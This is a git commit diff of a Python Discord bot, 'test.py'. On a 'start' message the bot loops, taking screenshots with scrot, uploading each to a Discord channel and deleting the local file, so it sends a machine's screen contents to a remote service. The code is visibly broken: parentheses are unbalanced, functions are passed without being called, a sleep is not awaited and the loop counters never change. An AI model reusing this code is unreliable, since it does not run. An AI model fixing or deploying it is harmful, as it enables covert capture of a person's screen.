c19c06d2504d9bafc3f92e5eeb2af211e0c9fdaf
theoneslayingadam <125176446+theoneslayingadam@users.noreply.github.com>
2023-02-23 17:23:14 +0700

    Update test.py

--- test.py
+++ test.py
@@ -9,6 +9,11 @@ client = discord.Client(intents=intents)
 token = INSERTTOKENHERE
 n = 1
 i = 10
+async def async_func():
+ await asyncio.create_subprocess_shell('scrot screen.png')
+
+async def async_func1():
+ await asyncio.create_subprocess_shell('rm screen.png')
 @client.event
 async def on_ready():
     print(f'We have logged in as {client.user}')
@@ -17,9 +22,9 @@ async def on_message(message)
  if message.content.startswith('start'):
   while True:
   if n > i:
-   await asyncio.create_subprocess_shell('scrot screen.png')
+   asyncio.run(async_func))
    await channel.send(file=discord.File('screen.png'))
-   await asyncio.create_subprocess_shell('rm screen.png')
+   asyncio.run(async_func1))
   else:
    asyncio.sleep(0.5)
 client.run(token)
